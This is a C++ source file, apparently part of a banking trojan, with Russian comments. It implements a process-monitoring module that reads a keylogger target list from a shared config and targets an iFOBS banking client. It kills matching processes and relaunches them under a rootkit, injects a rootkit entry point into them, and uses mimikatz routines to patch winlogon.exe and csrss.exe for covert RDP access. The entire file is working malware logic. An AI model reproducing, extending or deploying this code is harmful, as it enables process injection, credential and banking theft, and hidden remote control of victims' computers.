#include "MonitoringProcesses.h"
#include "manager.h"
#include "core\debug.h"
#include "core\process.h"
#include "core\injects.h"
#include "core\file.h"
#include "main.h"
#include "sandbox.h"
#include "system.h"
#ifdef ON_MIMIKATZ
#include "mimikatz\mimikatz.h"
#endif

namespace MonitoringProcesses
{

const uint RUN_WITH_ROOTKIT = 0x00000001; //процесс нужно убить и стартануть через rootkit
const uint ONLY_ADD_PID = 0x00000002; //инжектится не нужно, только запоминаем pid
const uint PROCESS_FOR_RDP = 0x00000004; //процесс для рдп патчинга

//устанавливается в true если нужно обновить конгиф процессов которые мониторим
bool updateKlgConfig = false;
int RDP; //0 - рдп не включен, 1 - нужно включить режи рдп, 2 - режим рдп включен
bool monitoringStop = false;

const char* winlogonExe = _CT_("winlogon.exe");
const char* csrssExe = _CT_("csrss.exe");

DWORD WINAPI Monitoring( void * );
void AddProcessesForRDP( StringArray& sa, Vector<uint>& flags );

bool Start()
{
	RDP = 0;
	MonProcessServer* monServer = new MonProcessServer();
	monServer->Reg();
	monServer->StartAsync();
	return RunThread( Monitoring, 0 );
}

static void GetMonitoringProcesses( StringArray& sa, Vector<uint>& flags )
{
	Mem::Data klgData;
	//запоминаем процессы за которыми нужно следить
	for( int i = 0; i < 10; i++ )
	{
		if( ManagerServer::GetSharedFile(_CS_("klgconfig"), klgData ) )
			break;
		Delay(1000);
	}
	StringBuilder cfg(klgData);
	StringArray processes = cfg.Split( '\n' );
	sa.DelAll();
	flags.DelAll();
	for( int i = 0; i < processes.Count(); i++ )
	{
		StringArray masks = processes[i]->Split(';');
		if( masks.Count() > 0 && !masks[0]->IsEmpty() )
		{
			DbgMsg( "Добавлен мониторинг процесса '%s' %d", masks[0]->c_str(), masks[0]->Len() );
			sa.Add(masks[0]);
			int flag = 0;
			if( Config::state & NOT_DIRECT_INJECT )
				flag |= RUN_WITH_ROOTKIT;
			flags.Add(flag);
		}
	}
#ifdef ON_IFOBS
	StringBuilder ifobs;
	ifobs = DECODE_STRING(IFobs::nameProcess);
	sa.Add(ifobs);
	flags.Add(RUN_WITH_ROOTKIT);
#endif
	if( RDP == 2 ) AddProcessesForRDP( sa, flags );
	updateKlgConfig = false;
}

void AddProcessesForRDP( StringArray& sa, Vector<uint>& flags )
{
	StringBuilder name;
	name = DECODE_STRING(winlogonExe);
	sa.Add(name);
	flags.Add( ONLY_ADD_PID | PROCESS_FOR_RDP );
	DbgMsg( "Добавлен для мониторинга процесс %s", name.c_str() );
	name = DECODE_STRING(csrssExe);
	sa.Add(name);
	flags.Add( ONLY_ADD_PID | PROCESS_FOR_RDP );
	DbgMsg( "Добавлен для мониторинга процесс %s", name.c_str() );
}

static bool KillCallback( Process::ProcessInfo& pi, void* tag )
{
	StringArray& processes = *(StringArray*)tag;
	for( int i = 0; i < processes.Count(); i++ )
	{
		if( pi.fileName.IndexOf(processes[i]) >= 0 )
		{
			DbgMsg( "Killed '%s'", pi.fileName.c_str() );
			Process::Kill( pi.pid, 5000 );
		}
	}
	return false;
}

static void PatchProcessForRDP( StringBuilder& nameProcess, DWORD pid )
{
	DbgMsg( "Патчинг процесса %s, pid: %d", nameProcess.c_str(), pid );
#ifdef ON_MIMIKATZ
	if( nameProcess == DECODE_STRING(winlogonExe) )
		MimikatzPatchWinlogon(pid);
	else if( nameProcess == DECODE_STRING(csrssExe) )
		MimikatzPatchCsrss(pid);
#endif
}

struct DataMonitoring
{
	StringArray* processes;
	Vector<uint>* flags;
	Vector<DWORD>* pids;
	Vector<bool>* actualPids;
};

static bool MonitoringCallback( Process::ProcessInfo& pi, void* tag )
{
	DataMonitoring* data = (DataMonitoring*)tag;
	//смотрим, может в нем уже сидим
	int j = 0;
	for( ; j < data->pids->Count(); j++ )
		if( (*data->pids)[j] == pi.pid ) //уже заинжектены
			break;
	if( j < data->pids->Count() )
	{
		(*data->actualPids)[j] = true;
	}
	else
	{
		for( int i = 0; i < data->processes->Count(); i++ )
		{
			if( pi.fileName.IndexOf((*data->processes)[i]) >= 0 ) //нашли процесс
			{
				if( j >= data->pids->Count() ) //запустился новый процесс
				{
					DbgMsg( "Появился процесс '%s', pid: %d", pi.fileName.c_str(), pi.pid );
					uint& flag = data->flags->Get(i);
					if( (flag & (RUN_WITH_ROOTKIT | ONLY_ADD_PID)) == RUN_WITH_ROOTKIT )
					{
						StringBuilder cmdLine;
						if( !Process::GetCommandLine( pi.pid, cmdLine ) )
							cmdLine = pi.fullPath;
						Process::Kill( pi.pid, 5000 );
						flag |= ONLY_ADD_PID; //когда снова запустится, будем только добавлять в список пидов
						//запускаем снова, чтобы заинжектится пораньше
						Sandbox::Exec( cmdLine, Sandbox::INIT_ROOTKIT, MAIN_USER );	
					}
					else
					{
						data->pids->Add(pi.pid);
						data->actualPids->Add(true);
						if( flag & PROCESS_FOR_RDP )
						{
							PatchProcessForRDP( pi.fileName, pi.pid );
						}
						else
						{
							if( (flag & ONLY_ADD_PID) == 0 )
							{
#ifndef WIN64
								InjectIntoProcess2( pi.pid, RootkitEntry );
								//InjectToProcessRootkit( pi.pid, RootkitEntry );
#endif
							}
							else
								flag ^= ONLY_ADD_PID;
						}
					}
				}
				break;
			}
		}
	}
	return false;
}

DWORD WINAPI Monitoring( void* )
{
	updateKlgConfig = false;
	DbgMsg( "Запущен мониторинг процессов" );
	StringArray monProcesses;
	Vector<uint> flags;
	for( int i = 0; i <= 20; i++ )
	{
		if( updateKlgConfig || i == 20 )
		{
			GetMonitoringProcesses( monProcesses, flags );
			break;
		}
		Delay(500);
	}
//	if( monProcesses.Count() == 0 ) return 0;
	//убиваем процессы которые собираемся мониторить
	Process::ListProcess( KillCallback, &monProcesses );
	//массив в котором указываются процессы которые уже запущены (мониторится нами)
	Vector<DWORD> runnedPids; //пиды процессов в которые уже заинжектились
	Vector<bool> actualPids; //какие иды процессов рабочие
	DataMonitoring data;
	data.processes = &monProcesses;
	data.flags = &flags;
	data.pids = &runnedPids;
	data.actualPids = &actualPids;
	monitoringStop = false;
	while( !monitoringStop )
	{
		for( int i = 0; i < actualPids.Count(); i++ )
			actualPids[i] = false;
		Process::ListProcess( MonitoringCallback, &data );
		int i = 0;
		while( i < actualPids.Count() )
		{
			if( !actualPids[i] ) //процесс был закрыт
			{
				DbgMsg("Процесс с pid: %d закрыт", runnedPids[i] );
				runnedPids.Del(i);
				actualPids.Del(i);
			}
			else
				i++;
		}
		if( updateKlgConfig ) 
		{
			GetMonitoringProcesses( monProcesses, flags );
		}
		if( RDP == 1 )
		{
			AddProcessesForRDP( monProcesses, flags );
			RDP = 2;
		}
		Delay(100);
	}
	return 0;
}

}

///////////////////////////////////////////////////////////////////////////////////////////////////

MonProcessServer::MonProcessServer()
{
}

MonProcessServer::~MonProcessServer()
{
}

int MonProcessServer::Handler( Pipe::Msg* msgIn, void** msgOut )
{
	int res = 0;
	switch( msgIn->cmd )
	{
		case CmdUpdateKlg:
			MonitoringProcesses::updateKlgConfig = true;
			break;
		case CmdRDP:
			if( MonitoringProcesses::RDP == 0 ) MonitoringProcesses::RDP = 1;
			break;
	}
	return res;
}

void MonProcessServer::Disconnect()
{
	MonitoringProcesses::monitoringStop = true;
	DbgMsg( "Мониторинг процессов отключен" );
}

bool MonProcessServer::Reg()
{
	return ManagerServer::RegMonitoringProcesses(this);
}
